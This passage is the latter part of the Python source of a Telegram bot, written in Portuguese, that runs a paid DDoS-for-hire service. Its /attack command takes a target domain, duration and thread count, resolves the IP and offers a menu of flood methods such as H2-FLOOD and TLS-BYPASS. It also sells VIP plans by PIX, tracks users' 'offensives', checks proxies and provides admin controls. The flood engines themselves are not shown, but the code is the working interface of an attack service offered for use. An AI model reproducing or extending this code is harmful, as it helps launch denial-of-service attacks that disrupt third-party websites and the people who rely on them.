        try:
            return await update.message.reply_photo(photo=foto_id, caption=txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        except Exception: pass
    await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)

async def setip_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_access(update, context): return
    if not has_api_access(uid): return await update.message.reply_text("❌ Negado.", parse_mode=constants.ParseMode.HTML)
    if not context.args: return await update.message.reply_text("💡 <b>Uso:</b> <code>/setip 192.168.x.x</code>", parse_mode=constants.ParseMode.HTML)
    new_ip = context.args[0]
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("UPDATE api_keys SET auth_ip = ? WHERE user_id = ?", (new_ip, uid))
    conn.commit(); conn.close()
    await update.message.reply_text(f"✅ <b>IP AUTORIZADO:</b> <code>{new_ip}</code>.", parse_mode=constants.ParseMode.HTML)

async def get_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    msg = update.message.text
    uid = update.effective_user.id
    if not await check_access(update, context): return
    if "/me" in msg:
        conn = sqlite3.connect('nfu_master.db')
        c = conn.cursor().execute("SELECT COUNT(*) FROM ataques WHERE user_id = ?", (uid,)).fetchone()[0]
        conn.close()
        _, plano_atual, exp = get_user_status(uid)
        txt = format_message("BIOMETRIA DO AGENTE", [
            f"🆔 <b>Hash UID:</b> <code>{uid}</code>",
            f"📦 <b>Plano Detectado:</b> <code>{plano_atual.upper()}</code>",
            f"⏳ <b>Expira em:</b> <code>{exp if exp else 'N/A'}</code>",
            f"⚡ <b>Ofensivas Lançadas:</b> <code>{c}</code>"
        ])
        await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
    elif "/status" in msg:
        cpu = psutil.cpu_percent(interval=0.5); ram = psutil.virtual_memory().percent
        uptime = str(timedelta(seconds=int(time.time() - bot_start_time)))
        try:
            with open("proxy.txt", "r") as f:
                proxies_count = sum(1 for line in f if line.strip())
        except FileNotFoundError:
            proxies_count = 0
        txt = format_message("ESTATÍSTICAS DA BAREMETAL", [
            f"💻 <b>Carga da CPU:</b> <code>{cpu}%</code>",
            f"🧠 <b>Uso de RAM:</b> <code>{ram}%</code>",
            f"⏱️ <b>Uptime Total:</b> <code>{uptime}</code>",
            f"🛡️ <b>Rotas Carregadas:</b> <code>{proxies_count} em proxy.txt</code>"
        ])
        await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)
    elif "/rank" in msg:
        conn = sqlite3.connect('nfu_master.db')
        res = conn.cursor().execute("SELECT username, COUNT(*) as c FROM ataques GROUP BY user_id ORDER BY c DESC LIMIT 10").fetchall()
        conn.close()
        rank_list = "\n".join([f"│ 🏆 <b>{i+1}.</b> <code>{n}</code> ━ {c} Ofensivas" for i, (n, c) in enumerate(res)])
        txt = format_message("HALL DA FAMA (TOP 10)", [
            rank_list
        ])
        await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

async def resgatar_gift(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    user = update.effective_user
    uid = user.id
    if not await check_access(update, context): return
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT user_id FROM users WHERE user_id = ?", (uid,))
    if not cur.fetchone():
        fname = user.full_name if hasattr(user, 'full_name') and user.full_name else user.first_name
        cur.execute("INSERT INTO users (user_id, username, full_name) VALUES (?, ?, ?)", (uid, user.username, fname))
        conn.commit()
    if not context.args:
        conn.close()
        return await update.message.reply_text("💡 <b>Modo de Uso:</b>\n<code>/resgatar MDZ-CODIGO-AQUI</code>", parse_mode=constants.ParseMode.HTML)
    vip_ativo, plano_atual, _ = get_user_status(uid)
    if vip_ativo and uid != OWNER_ID:
        conn.close()
        return await update.message.reply_text(
            "❌ <b>SISTEMA REJEITADO:</b> Você já possui um plano VIP ativo.\n"
            "<i>Aguarde a expiração ou contate o Supremo para sobrepor pacotes.</i>",
            parse_mode=constants.ParseMode.HTML
        )
    code = context.args[0].upper()
    cur.execute("SELECT days, plan FROM gifts WHERE code = ?", (code,))
    res = cur.fetchone()
    if not res:
        conn.close()
        return await update.message.reply_text("❌ <b>Código inválido, expirado ou já resgatado.</b>", parse_mode=constants.ParseMode.HTML)
    dias, plano = res[0], res[1]
    cur.execute("DELETE FROM gifts WHERE code = ?", (code,))
    exp = (datetime.now(SP_TZ) + timedelta(days=dias)).strftime('%Y-%m-%d %H:%M:%S')
    cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (uid, exp, plano))
    conn.commit(); conn.close()
    await update.message.reply_text(
        format_message("GIFT CARD RESGATADO!", [
            f"📦 <b>Plano Ativado:</b> <code>{plano.upper()}</code>",
            f"⏳ <b>Duração:</b> <code>{dias} DIAS</code>",
            f"📅 <b>Válido até:</b> <code>{exp}</code>"
        ]), parse_mode=constants.ParseMode.HTML)
    await send_log(context, "GIFT", uid, f"Resgatou Gift: {code} ({dias} dias - {plano})")

async def verificar_pagamento_loop(context, uid, trans_id, dias, plano_key, msg_id):
    timeout = time.time() + 3600
    while time.time() < timeout:
        try:
            resp = requests.get(f"{API_STATUS}{trans_id}", timeout=10)
            if resp.status_code != 200:
                await asyncio.sleep(15)
                continue
            res = resp.json()
            status = res.get("status_pagamento")
            if status == "CONCLUIDA":
                exp = (datetime.now(SP_TZ) + timedelta(days=dias)).strftime('%Y-%m-%d %H:%M:%S')
                conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
                cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (uid, exp, plano_key))
                cur.execute("DELETE FROM pending_payments WHERE trans_id = ?", (trans_id,))
                conn.commit(); conn.close()
                await send_log(context, "PAY_DONE", uid, f"Hash: {trans_id} | Plano: {plano_key.upper()}")
                txt_sucesso = format_message("PAGAMENTO CONFIRMADO!", [
                    f"Seu acesso <b>VIP ({plano_key.upper()})</b> foi liberado.",
                    f"⏳ <b>Expira em:</b> <code>{exp}</code>"
                ])
                try:
                    await context.bot.edit_message_caption(chat_id=uid, message_id=msg_id, caption=txt_sucesso, parse_mode=constants.ParseMode.HTML)
                except:
                    await context.bot.edit_message_text(chat_id=uid, message_id=msg_id, text=txt_sucesso, parse_mode=constants.ParseMode.HTML)
                return
            elif status in ["EXPIRADA", "CANCELADA"]:
                conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
                cur.execute("DELETE FROM pending_payments WHERE trans_id = ?", (trans_id,))
                conn.commit(); conn.close()
                try:
                    await context.bot.edit_message_caption(chat_id=uid, message_id=msg_id, caption="❌ <b>PAGAMENTO EXPIRADO OU CANCELADO.</b>", parse_mode=constants.ParseMode.HTML)
                except:
                    await context.bot.edit_message_text(chat_id=uid, message_id=msg_id, text="❌ <b>PAGAMENTO EXPIRADO OU CANCELADO.</b>", parse_mode=constants.ParseMode.HTML)
                return
        except Exception:
            pass
        await asyncio.sleep(15)
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("DELETE FROM pending_payments WHERE trans_id = ?", (trans_id,))
    conn.commit(); conn.close()
    try:
        await context.bot.edit_message_caption(chat_id=uid, message_id=msg_id, caption="❌ <b>FATURA EXPIRADA.</b>", parse_mode=constants.ParseMode.HTML)
    except:
        pass

async def comprar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not await check_access(update, context): return
    if get_config("pix_system") == "off":
        return await update.message.reply_text("❌ <b>SISTEMA DE COMPRAS DESATIVADO</b>\nO mercado negro está temporariamente fechado. Contate o Supremo para mais informações.", parse_mode=constants.ParseMode.HTML)
    kb = [
        [InlineKeyboardButton(f"⚡ ACESSO 24H - R$ {PLANOS['diario']['valor']:.2f}", callback_data="buy_diario")],
        [InlineKeyboardButton(f"🛰️ SEMANAL - R$ {PLANOS['semanal']['valor']:.2f}", callback_data="buy_semanal")],
        [InlineKeyboardButton(f"💎 MENSAL - R$ {PLANOS['mensal']['valor']:.2f}", callback_data="buy_mensal")],
        [InlineKeyboardButton(f"🔥 TRIMESTRAL - R$ {PLANOS['trimestral']['valor']:.2f}", callback_data="buy_trimestral")],
    ]
    txt = format_message("MERCADO NEGRO TW-MDZ (VIP)", [
        "⚠️ <b>ATENÇÃO, AGENTE:</b>",
        "Para liberar o plano <b>TRIAL (3 dias)</b>,",
        "adquirir o pacote <b>👑 VITALÍCIO</b>,",
        "ou resolver falhas no sistema de PIX automático,",
        "<b>CONTATE O SUPORTE DIRETAMENTE:</b>",
        f"💬 <b>{SUPORTE_USER}</b>"
    ])
    foto_id = get_config("menu_photo")
    if foto_id != "off":
        try:
            return await update.message.reply_photo(photo=foto_id, caption=txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        except Exception: pass
    await update.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not await check_access(update, context): return

    user = update.effective_user
    uid = user.id
    chat_id = update.effective_chat.id
    is_group = update.effective_chat.type in [constants.ChatType.GROUP, constants.ChatType.SUPERGROUP]

    vip_status, plano, _ = get_user_status(uid)
    if not vip_status and get_config("free_plan") == "off":
        return await update.message.reply_text("❌ <b>Plano gratuito desativado, contrate um plano.</b>", parse_mode=constants.ParseMode.HTML)

    if not context.args:
        msg_uso = "💡 <b>Modo de Uso:</b>\n<code>/attack dominio.com [tempo]</code>"
        if plano == 'vitalicio' or uid == OWNER_ID:
            msg_uso += "\n<i>(Vitalício)</i> <code>/attack dominio.com [tempo] [threads(max:10)]</code>"
        return await update.message.reply_text(msg_uso, parse_mode=constants.ParseMode.HTML)

    raw_target = context.args[0].lower()
    target = f"https://{raw_target}" if not raw_target.startswith("https") else raw_target

    if uid != OWNER_ID and is_blacklisted_total(target):
        return await update.message.reply_text("🛡️ <b>FIREWALL MILITAR ATIVO (BLACKLIST TOTAL)</b>\n<i>Este alvo está protegido pela jurisdição suprema e não pode ser atingido.</i>", parse_mode=constants.ParseMode.HTML)

    if not vip_status and is_blacklisted(target):
        return await update.message.reply_text("🛡️ <b>FIREWALL MILITAR ATIVO</b>\n<i>Domínio restrito. Acesso exclusivo para VIPs.</i>", parse_mode=constants.ParseMode.HTML)

    domain_to_check = urlparse(target).netloc or urlparse(target).path
    domain_to_check = domain_to_check.split(":")[0]
    msg_check = await update.message.reply_text(f"🔎 <i>Mapeando arquitetura de {domain_to_check}...</i>", parse_mode=constants.ParseMode.HTML)

    try:
        resolved_ip = socket.gethostbyname(domain_to_check)
    except socket.gaierror:
        return await msg_check.edit_text("❌ <b>ALVO INVÁLIDO, VERIFIQUE SE CONTÉM https:// ou se o site existe.</b> ", parse_mode=constants.ParseMode.HTML)

    cd = 0 if vip_status else COOLDOWN_FREE
    if uid in last_attack_time and (time.time() - last_attack_time[uid] < cd):
        rem = int(cd - (time.time() - last_attack_time[uid]))
        return await msg_check.edit_text(f"⏳ <b>ARMAS SUPERAQUECIDAS:</b> <code>{rem}s</code>.", parse_mode=constants.ParseMode.HTML)

    limit_time = get_group_limit(chat_id) if is_group else MAX_TIME_VIP
    try:
        requested_time = int(context.args[1]) if len(context.args) > 1 else MAX_TIME_FREE
        atk_time = min(requested_time, limit_time if vip_status or uid == OWNER_ID else MAX_TIME_FREE)
    except:
        atk_time = MAX_TIME_FREE

    if plano == 'vitalicio' or uid == OWNER_ID:
        try:
            req_threads = int(context.args[2]) if len(context.args) > 2 else DEFAULT_THREADS
            atk_threads = min(req_threads, MAX_LIFETIME_THREADS)
        except:
            atk_threads = DEFAULT_THREADS
    else:
        atk_threads = DEFAULT_THREADS

    context.user_data['target'] = target
    context.user_data['time'] = atk_time
    context.user_data['threads'] = atk_threads

    # Exibe menu de métodos (agora com 14 métodos, 7 linhas)
    kb = [
        [InlineKeyboardButton("🔴 MDZ-AR", callback_data="mdzar"), InlineKeyboardButton("🛡️ MDZ-BY", callback_data="mdzby")],
        [InlineKeyboardButton("🌐 TLS-BYPASS", callback_data="tls"), InlineKeyboardButton("⚡ THUNDER", callback_data="tun")],
        [InlineKeyboardButton("🔥 RAPID V2", callback_data="rapid"), InlineKeyboardButton("🩸 LEZKILL", callback_data="lez")],
        [InlineKeyboardButton("🕸️ TW-MDZ", callback_data="tw-mdz"), InlineKeyboardButton("💣 MDZ-DDOS", callback_data="mdzdd")],
        [InlineKeyboardButton("🌊 H2-FLOOD", callback_data="h2"), InlineKeyboardButton("☣️ HTTPS-BYPASS", callback_data="hby")],
        [InlineKeyboardButton("💀 HTTP-FURY", callback_data="fury"), InlineKeyboardButton("⚰️ HTTP-KILL", callback_data="httpkill")],
        [InlineKeyboardButton("💥 MDZ-DESTROY", callback_data="mdzdestroy"), InlineKeyboardButton("🔥 MDZ-FUCK", callback_data="mdzfuck")]
    ]

    txt = format_message("SISTEMA DE MIRA TRAVADO", [
        f"🌐 <b>Host Alvo:</b> <code>{target}</code>",
        f"📡 <b>Endereço IP:</b> <code>{resolved_ip}</code>",
        f"⏱️ <b>Duração:</b> <code>{atk_time}s</code>",
        f"🧵 <b>Threads:</b> <code>{atk_threads}</code>",
        "┠ ──────────────────────────────────────",
        "<i>Selecione o payload de destruição:</i>"
    ])
    await msg_check.edit_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)

async def admin_tools(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    uid = update.effective_user.id
    if uid != OWNER_ID: return
    cmd = update.message.text.split()
    cmd_name = cmd[0].lower()
    if cmd_name == "/bl" and len(cmd) > 1:
        sites = cmd[1].split(",")
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        inseridos = 0
        for site in sites:
            site = site.strip()
            if site: 
                cur.execute("INSERT OR IGNORE INTO blacklist (domain) VALUES (?)", (site,))
                inseridos += 1
        conn.commit(); conn.close()
        await update.message.reply_text(f"✅ <b>BLACKLIST COMUM ATUALIZADA:</b> {inseridos} domínio(s) inserido(s).", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/bl2" and len(cmd) > 1:
        sites = cmd[1].split(",")
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        inseridos = 0
        for site in sites:
            site = site.strip()
            if site: 
                cur.execute("INSERT OR IGNORE INTO blacklist_total (domain) VALUES (?)", (site,))
                inseridos += 1
        conn.commit(); conn.close()
        await update.message.reply_text(f"🛡️ <b>BLACKLIST TOTAL ATUALIZADA:</b> {inseridos} domínio(s) protegido(s).", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/rmbl" and len(cmd) > 1:
        site = cmd[1].strip()
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("DELETE FROM blacklist WHERE domain = ?", (site,))
        linhas_afetadas = cur.rowcount
        conn.commit(); conn.close()
        if linhas_afetadas > 0:
            await update.message.reply_text(f"✅ <b>Removido:</b> <code>{site}</code> retirado da BLACKLIST COMUM.", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(f"⚠️ O domínio <code>{site}</code> não foi encontrado.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/rmbl2" and len(cmd) > 1:
        site = cmd[1].strip()
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("DELETE FROM blacklist_total WHERE domain = ?", (site,))
        linhas_afetadas = cur.rowcount
        conn.commit(); conn.close()
        if linhas_afetadas > 0:
            await update.message.reply_text(f"🛡️ <b>Removido:</b> <code>{site}</code> retirado da BLACKLIST TOTAL.", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(f"⚠️ O domínio <code>{site}</code> não foi encontrado.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/list":
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("SELECT domain FROM blacklist")
        bl_comum = cur.fetchall()
        cur.execute("SELECT domain FROM blacklist_total")
        bl_total = cur.fetchall()
        conn.close()
        txt_lista = "📋 <b>SISTEMA DE PROTEÇÃO: DOMÍNIOS LISTADOS</b>\n\n"
        txt_lista += "🛡️ <b>BLACKLIST COMUM (Restrito a FREE):</b>\n"
        for d in bl_comum: txt_lista += f" ┣ <code>{d[0]}</code>\n"
        if not bl_comum: txt_lista += " ┗ <i>(Nenhum domínio configurado)</i>\n"
        txt_lista += "\n⛔ <b>BLACKLIST TOTAL (Restrito a TODOS):</b>\n"
        for d in bl_total: txt_lista += f" ┣ <code>{d[0]}</code>\n"
        if not bl_total: txt_lista += " ┗ <i>(Nenhum domínio configurado)</i>\n"
        await update.message.reply_text(txt_lista, parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/setpic":
        if update.message.reply_to_message and update.message.reply_to_message.photo:
            file_id = update.message.reply_to_message.photo[-1].file_id
            set_config("menu_photo", file_id)
            await update.message.reply_text("✅ <b>SISTEMA:</b> Imagem capturada e aplicada com sucesso nos menus globais.", parse_mode=constants.ParseMode.HTML)
        elif len(cmd) > 1 and cmd[1].lower() == "off":
            set_config("menu_photo", "off")
            await update.message.reply_text("✅ <b>SISTEMA:</b> Mídia visual do painel inicial foi DESATIVADA.", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text("💡 <b>Uso:</b> Responda a uma foto com <code>/setpic</code> ou digite <code>/setpic off</code>.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/fotomenu" and len(cmd) > 1:
        url_ou_off = cmd[1]
        set_config("menu_photo", url_ou_off)
        if url_ou_off.lower() == "off":
            await update.message.reply_text("✅ <b>SISTEMA:</b> Mídia visual do painel inicial foi DESATIVADA.", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(f"🖼️ <b>SISTEMA:</b> Mídia do painel configurada por URL.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/gift" and len(cmd) > 1:
        try:
            days = int(cmd[1])
            plan_type = cmd[2].lower() if len(cmd) > 2 else 'mensal'
            if plan_type not in PLANOS and plan_type != "vitalicio": plan_type = "mensal"
            code = f"MDZ-{uuid.uuid4().hex[:8].upper()}"
            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            cur.execute("INSERT INTO gifts (code, days, plan) VALUES (?, ?, ?)", (code, days, plan_type))
            conn.commit(); conn.close()
            bot_usr = context.bot.username
            deep_link = f"https://t.me/{bot_usr}?start=gift_{code}"
            txt = format_message("GIFT CARD GERADO (SUPREMO)", [
                f"📦 <b>Plano Oculto:</b> <code>{plan_type.upper()}</code>",
                f"⏳ <b>Dias Reais:</b> <code>{days}</code>",
                f"🔑 <b>Código:</b> <code>{code}</code>",
                "🔗 <b>Link de Resgate Automático:</b>",
                f"<code>{deep_link}</code>",
                "<i>Mande para o recruta o link acima ou: <code>/resgatar {code}</code></i>"
            ])
            await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)
        except:
            await update.message.reply_text("💡 Uso: <code>/gift DIAS [plano]</code>", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/free" and len(cmd) > 1:
        estado = cmd[1].lower()
        if estado in ["on", "off"]:
            set_config("free_plan", estado)
            await update.message.reply_text(f"✅ <b>SISTEMA:</b> Plano Gratuito alterado para: <code>{estado.upper()}</code>", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text("💡 Uso correto: <code>/free on</code> ou <code>/free off</code>", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/manutencao" and len(cmd) > 1:
        estado = cmd[1].lower()
        if estado in ["on", "off"]:
            set_config("maintenance", estado)
            await update.message.reply_text(f"🛠️ <b>SISTEMA:</b> Modo Manutenção alterado para: <code>{estado.upper()}</code>", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text("💡 Uso correto: <code>/manutencao on</code> ou <code>/manutencao off</code>", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/pixmenu" and len(cmd) > 1:
        estado = cmd[1].lower()
        if estado in ["on", "off"]:
            set_config("pix_system", estado)
            await update.message.reply_text(f"✅ <b>SISTEMA DE COMPRAS:</b> <code>{estado.upper()}</code>", parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text("💡 Uso: <code>/pixmenu on</code> ou <code>/pixmenu off</code>", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/ban" and len(cmd) > 1:
        target_id = int(cmd[1])
        motivo = " ".join(cmd[2:]) if len(cmd) > 2 else "Violação das diretrizes do núcleo."
        banned_users[target_id] = {"expires": 2147483647, "reason": motivo}
        await update.message.reply_text(f"⛔ <b>ORDEM EXECUTADA:</b> Usuário <code>{target_id}</code> exilado da rede.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/unban" and len(cmd) > 1:
        target_id = int(cmd[1])
        if target_id in banned_users: del banned_users[target_id]
        await update.message.reply_text(f"✅ <b>ORDEM EXECUTADA:</b> Anistia manual concedida ao usuário <code>{target_id}</code>.", parse_mode=constants.ParseMode.HTML)
        try: await context.bot.send_message(target_id, "🔓 <b>BANIMENTO REMOVIDO.</b>", parse_mode=constants.ParseMode.HTML)
        except: pass
    elif cmd_name == "/addvip" and len(cmd) > 2:
        try:
            target_id, days = int(cmd[1]), int(cmd[2])
            plan_type = cmd[3].lower() if len(cmd) > 3 else 'mensal'
            if plan_type not in PLANOS and plan_type != "vitalicio": plan_type = "mensal"
            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            exp = (datetime.now(SP_TZ) + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
            cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (target_id, exp, plan_type))
            conn.commit(); conn.close()
            await update.message.reply_text(f"✅ <b>INJETADO:</b> VIP ({plan_type.upper()}) concedido a {target_id} por {days} dias.", parse_mode=constants.ParseMode.HTML)
        except Exception as e: await update.message.reply_text(f"❌ Erro de sintaxe. Uso: /addvip ID DIAS [plano]")
    elif cmd_name == "/rmvip" and len(cmd) > 1:
        try:
            target_id = int(cmd[1])
            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            cur.execute("DELETE FROM vips WHERE user_id = ?", (target_id,))
            conn.commit(); conn.close()
            await update.message.reply_text(
                format_message("ORDEM DE REVOGAÇÃO EXECUTADA", [
                    f"👤 <b>Usuário:</b> <code>{target_id}</code>",
                    f"⚠️ <b>Status:</b> VIP REMOVIDO DO NÚCLEO"
                ]), parse_mode=constants.ParseMode.HTML)
            try: await context.bot.send_message(target_id, "⚠️ <b>Seus privilégios VIP foram revogados.</b>", parse_mode=constants.ParseMode.HTML)
            except: pass
        except: await update.message.reply_text("💡 Uso: <code>/rmvip ID</code>", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/broadcast":
        if not update.message.reply_to_message and len(cmd) <= 1:
            return await update.message.reply_text("💡 Uso: Responda a uma mensagem (texto/mídia) com `/broadcast` ou digite `/broadcast <sua mensagem>`.", parse_mode=constants.ParseMode.MARKDOWN)
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("SELECT user_id FROM users")
        usuarios = cur.fetchall()
        conn.close()
        enviados = 0
        for (u,) in usuarios:
            try:
                if update.message.reply_to_message:
                    await update.message.reply_to_message.copy(chat_id=u)
                else:
                    msg = update.message.text.split(maxsplit=1)[1]
                    await context.bot.send_message(chat_id=u, text=format_message("ALERTA GERAL DO NÚCLEO", [msg]), parse_mode=constants.ParseMode.HTML)
                enviados += 1
            except: pass
        await update.message.reply_text(f"✅ <b>Propagação Multimídia Concluída.</b>\nMensagem entregue para {enviados} nodos ativos.", parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/vips":
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("SELECT v.user_id, v.expiry, v.plan, u.username, u.full_name FROM vips v LEFT JOIN users u ON v.user_id = u.user_id")
        vips = cur.fetchall(); conn.close()
        if not vips: return await update.message.reply_text("Nenhum VIP ativo no banco de dados.")
        lista = "<b>LISTA DE VIPS ATIVOS:</b>\n\n"
        for v in vips:
            try:
                exp_date = datetime.strptime(v[1], '%Y-%m-%d %H:%M:%S')
                exp_date = SP_TZ.localize(exp_date) if exp_date.tzinfo is None else exp_date
                now = datetime.now(SP_TZ)
                if exp_date > now:
                    user_tag = f"@{v[3]}" if v[3] else html.escape(v[4]) if v[4] else "Agente"
                    lista += f"👤 {user_tag}\n🆔 <code>{v[0]}</code> | 📦 {v[2].upper()} | ⏳ {v[1]}\n\n"
            except: pass
        if len(lista) > 4000:
            for i in range(0, len(lista), 4000):
                await update.message.reply_text(lista[i:i+4000], parse_mode=constants.ParseMode.HTML)
        else:
            await update.message.reply_text(lista, parse_mode=constants.ParseMode.HTML)
    elif cmd_name == "/aprv" and len(cmd) > 2:
        try:
            target_id = int(cmd[1])
            plano_key = cmd[2].lower()
            if plano_key not in PLANOS and plano_key != "vitalicio": 
                return await update.message.reply_text("❌ Plano inválido.")
            dias = PLANOS[plano_key]['dias'] if plano_key in PLANOS else 36500
            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            exp = (datetime.now(SP_TZ) + timedelta(days=dias)).strftime('%Y-%m-%d %H:%M:%S')
            cur.execute("INSERT OR REPLACE INTO vips (user_id, expiry, plan) VALUES (?, ?, ?)", (target_id, exp, plano_key))
            conn.commit(); conn.close()
            await update.message.reply_text(f"✅ Pagamento do plano {plano_key} aprovado p/ {target_id}.", parse_mode=constants.ParseMode.HTML)
            try: await context.bot.send_message(target_id, f"🎉 <b>Seu pagamento foi aprovado manualmente pelo Suporte!</b> VIP ({plano_key.upper()}) ativado até {exp}.", parse_mode=constants.ParseMode.HTML)
            except: pass
        except Exception as e:
            await update.message.reply_text(f"💡 Uso: <code>/aprv ID PLANO</code>. Erro: {e}", parse_mode=constants.ParseMode.HTML)
    else:
        await update.message.reply_text("Comando admin não reconhecido.", parse_mode=constants.ParseMode.HTML)

async def notas_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    if not await check_access(update, context): return
    txt = format_message("NOTAS DE ATUALIZAÇÃO (PATCH)", [
        "🛠️ <b>Versão Atual:</b> V96.5",
        "┠ ──────────────────────────────────────",
        "🆕 <b>ÚLTIMAS MELHORIAS:</b>",
        "1. <b>Novos métodos de ataque:</b> MDZ-DESTROY e MDZ-FUCK adicionados.",
        "2. <b>Canal de provas atualizado:</b> agora em @proofmd.",
        "3. <b>Proxy checker multi:</b> agora escaneia as últimas 30 mensagens em busca de arquivos .txt.",
        "4. <b>Otimizações de performance:</b> redução de timeout e maior concorrência no verificador de proxies.",
        "5. <b>Design aprimorado:</b> mensagens padronizadas com separadores e títulos."
    ])
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML)

# ==========================================
# 🔌 START E MAPPING
# ==========================================
def main():
    init_db(); carregar_blacklist()
    app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("menu", main_menu))
    app.add_handler(CommandHandler("invite", invite_cmd))
    app.add_handler(CommandHandler("vipmenu", vipmenu))
    app.add_handler(CommandHandler("setip", setip_cmd))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("comprar", comprar))
    app.add_handler(CommandHandler("resgatar", resgatar_gift))
    app.add_handler(CommandHandler("notas", notas_cmd))
    app.add_handler(CommandHandler("feed", feed_cmd))
    app.add_handler(CommandHandler("check", check_proxy_cmd))
    app.add_handler(CommandHandler("check2", check2_cmd))
    app.add_handler(CommandHandler("checkmulti", checkmulti_cmd))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    for c in ["me", "status", "rank"]: app.add_handler(CommandHandler(c, get_info))

    comandos_admin = ["ban", "unban", "addvip", "rmvip", "broadcast", "vips", "aprv", "free", "manutencao", "pixmenu", "gift", "bl", "bl2", "rmbl", "rmbl2", "list", "fotomenu", "setpic"]
    for c in comandos_admin:
        app.add_handler(CommandHandler(c, admin_tools))

    app.add_handler(CallbackQueryHandler(handle_callback))

    print("========================================")
    print("💀 TW-MDZ OMNI-CORE V96.5 BOOT SECURE")
    print("Engine by JohnNFU - Core Updated")
    print("========================================")
    app.run_polling()

if __name__ == '__main__':
    main()
